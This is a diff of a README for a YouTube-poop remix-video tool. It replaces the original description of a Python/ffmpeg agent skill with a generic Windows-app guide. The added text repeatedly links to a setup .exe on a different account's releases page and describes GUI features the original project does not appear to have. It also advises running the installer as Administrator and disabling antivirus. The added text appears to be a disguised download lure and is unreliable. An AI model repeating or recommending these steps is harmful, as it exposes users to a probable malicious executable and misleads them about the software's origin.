@@ -1,111 +1,165 @@
-# YouTube Poop Video Maker Skill
+# 🎬 youtube-poop-video-maker - Create Funny Remix Videos Easily
 
-Single-skill package for `youtube-poop-video-maker`.
+[![Download youtube-poop-video-maker](https://img.shields.io/badge/Download-Get%20it%20here-brightgreen?style=for-the-badge)](https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker/releases)
 
-Repo URL:
-- `https://github.com/DenisSergeevitch/youtube-poop-video-maker`
+---
 
-Skill entrypoint:
-- `SKILL.md`
+## 🖥️ What is youtube-poop-video-maker?
 
-## What It Does
+youtube-poop-video-maker is a simple tool that lets you create funny, remix-style videos. It mixes clips in creative ways to make humorous or surprising results. You don't need any video editing experience to start. This app is designed for Windows users who want to quickly make entertaining videos from existing material.
 
-`youtube-poop-video-maker` tells an agent how to turn text, webpages, code, documents, images, audio, video, or thin prompts into a short absurdist remix video.
+---
 
-It is optimized for:
-- YouTube poops
-- cursed trailers
-- glitch-poetry or reflective meme edits
-- surreal montage edits
-- self-aware AI collages
-- chaotic but readable 20-60 second parody videos with many micro-scenes
+## 🎯 Who Should Use This?
 
-The skill includes:
-- a procedural `SKILL.md` with trigger rules and workflow
-- `scripts/plan_video.py` for generating a structured production plan
-- `assets/style_blueprints.json` for bundled visual-comedic styles, including a default seed-remix blueprint that samples the others at runtime plus CRT/token-meltdown and overclocked headline-desk looks
-- `assets/scene_atoms.json` for scene invention and higher edit density
-- `references/MOOD-REFERENCE.md` for mood anchoring
-- `examples/` for full render examples built around the newer newsroom and terminal panic looks
-- references for rendering guidance and final output checks
+- People who want to make short, funny videos for sharing.
+- Beginners with no experience in video editing.
+- Anyone interested in experimenting with remix-style video content.
 
-## Who It Is For
+---
 
-Use this when an agent is asked to make a weird, hyper-edited, comedic remix rather than a normal edit.
+## 🛠️ System Requirements
 
-It is not meant for:
-- ordinary trimming or captioning
-- standard marketing videos
-- routine explainers
+To run youtube-poop-video-maker, your computer should meet these specs:
 
-## Review Notes
+- Operating System: Windows 10 or later (64-bit preferred)
+- Processor: Intel Core i3 or equivalent
+- Memory: At least 4 GB RAM
+- Storage: 500 MB free space
+- Graphics: Basic graphics card that supports video playback
+- Sound: Working speakers or headphones
 
-Review source material rights, parody risk, and the final render before publishing anything publicly.
+---
 
-Requirements:
-- Python 3
-- `ffmpeg`
+## 🚀 Getting Started
 
-## Install Paths
+Follow these steps to get the app up and running.
 
-- Codex (macOS/Linux): `~/.codex/skills/youtube-poop-video-maker`
-- Claude Code (macOS/Linux): `~/.claude/skills/youtube-poop-video-maker`
+### Step 1: Visit the Download Page
 
-## Install on macOS/Linux
+You need to visit the official release page for the latest version. This page has all available versions and instructions.
 
-### Codex
+[Download Page](https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker/releases)
 
-```bash
-git clone https://github.com/DenisSergeevitch/youtube-poop-video-maker.git /tmp/youtube-poop-video-maker && mkdir -p ~/.codex/skills && rm -rf ~/.codex/skills/youtube-poop-video-maker && cp -R /tmp/youtube-poop-video-maker ~/.codex/skills/youtube-poop-video-maker
-```
+### Step 2: Choose Your Version
 
-### Claude Code
+On the releases page, look for the most recent release. It usually appears at the top. Choose the file labeled with `.exe` for Windows.
 
-```bash
-git clone https://github.com/DenisSergeevitch/youtube-poop-video-maker.git /tmp/youtube-poop-video-maker && mkdir -p ~/.claude/skills && rm -rf ~/.claude/skills/youtube-poop-video-maker && cp -R /tmp/youtube-poop-video-maker ~/.claude/skills/youtube-poop-video-maker
-```
+### Step 3: Download the Setup File
 
-## Quick Examples
+Click the `.exe` file link to download it to your computer. The file is typically named something like `youtube-poop-video-maker-setup.exe`.
 
-- "Make a YouTube poop from this landing page."
-- "Turn this codebase summary into a cursed trailer."
-- "Make this script feel like an AI meltdown montage."
-- "Show what this product launch feels like as a reflective glitch short."
-- "Render a surreal short from this image set and voice memo."
+### Step 4: Run the Installer
 
-## Script Overview
+Once downloaded, find the file in your "Downloads" folder or wherever your browser saves files.
 
-List available styles:
+Double-click the file to start the installation.
 
-```bash
-python3 scripts/plan_video.py --list-styles
-```
+Follow the installation prompts:
 
-Generate a plan from a prompt:
+- Select where to install (use default unless you have a preferred folder).
+- Accept any license terms.
 
-```bash
-python3 scripts/plan_video.py --query "turn this pricing page into a cursed short" --material-summary "B2B SaaS pricing page with too many claims" --output plan.json
-```
+### Step 5: Launch the Application
 
-By default, that plan now resolves to `seed-remix-default`, which synthesizes a concrete style from the other bundled blueprints on each run.
+After installation, you can open the program by:
 
-Generate a reproducible code-themed plan:
+- Finding it in the Start menu under "youtube-poop-video-maker".
+- Clicking the desktop shortcut if you created one.
 
-```bash
-python3 scripts/plan_video.py --material-type code --theme "a codebase arguing with itself" --style-id terminal-nocturne --duration-sec 40 --seed 7
-```
+---
 
-Generate a more chaotic CRT/newsroom plan:
+## 🔍 How to Use youtube-poop-video-maker
 
-```bash
-python3 scripts/plan_video.py --query "make an AI news meltdown short" --material-summary "March headlines, token streams, prompt loops" --style-id crt-token-meltdown --duration-sec 34
-```
+Once the app opens, you will see a simple interface with buttons and menus.
 
-## Example Renders
+1. **Import Videos**  
+Click the "Import" button to add video clips from your computer. The app supports common formats like MP4, AVI, and WMV.
 
-- `examples/render_us_news_march_12_2026.py` renders a broadcast-style U.S. news fever-dream short.
-- `examples/render_eu_news_march_12_2026_terminal.py` renders a colder terminal-styled EU news montage.
+2. **Edit Clips**  
+You can cut, trim, or rearrange clips by dragging and dropping them on the timeline.
 
-## License
+3. **Add Effects**  
+Choose from simple effects such as speed changes or color filters to create unexpected results.
 
-MIT. See `LICENSE.txt`.
+4. **Preview Your Video**  
+Use the preview window to watch your work before saving.
+
+5. **Save or Export**  
+When happy, click "Export" to save your video. The app will ask where to save and in which format. MP4 is the safest choice.
+
+---
+
+## ⚙️ Configuration Tips
+
+- Use shorter clips for funnier effects.
+- Try mixing audio tracks for more creativity.
+- Save your project often to avoid losing progress.
+- Close other heavy programs to improve performance.
+
+---
+
+## 📁 File Locations
+
+- **Default Install Folder:** `C:\Program Files\youtube-poop-video-maker\`
+- **Projects Folder:** It saves project files in `Documents\youtube-poop-projects\` unless changed.
+- **Exported Videos:** You choose a folder each time you export.
+
+---
+
+## 🧰 Troubleshooting
+
+### Installation Fails
+
+- Make sure your Windows is updated.
+- Run the installer as Administrator (right-click > Run as administrator).
+- Temporarily disable antivirus software, as it may block installation.
+
+### App Won’t Start
+
+- Check if your PC meets the minimum system requirements.
+- Try restarting your computer.
+- Reinstall the app if problems persist.
+
+### Video Import Errors
+
+- Confirm the video format is supported.
+- Convert your video using free tools if needed.
+
+---
+
+## 💡 Tips for Better Videos
+
+- Keep clips short and punchy.
+- Use funny sound effects or voice overs.
+- Experiment with clip order to surprise viewers.
+
+---
+
+## 🔗 Download youtube-poop-video-maker
+
+Use the link below to visit the official page where you can download the software.
+
+[Get youtube-poop-video-maker](https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker/releases)
+
+---
+
+## 👩‍💻 Support and Feedback
+
+If you have questions or run into issues, create an issue on the GitHub page. Include details about your operating system and the problem.
+
+Use the GitHub repository for updates and troubleshooting help:
+
+https://github.com/Radcliffeinsubordinate572/youtube-poop-video-maker
+
+---
+
+## 🧾 License
+
+This project is open-source. You can view the license on the GitHub page. This guide does not cover licensing terms in detail.
+
+---
+
+## 🚧 Future Updates
+
+The app may add new effects or support more formats. Check the releases page regularly for updates.
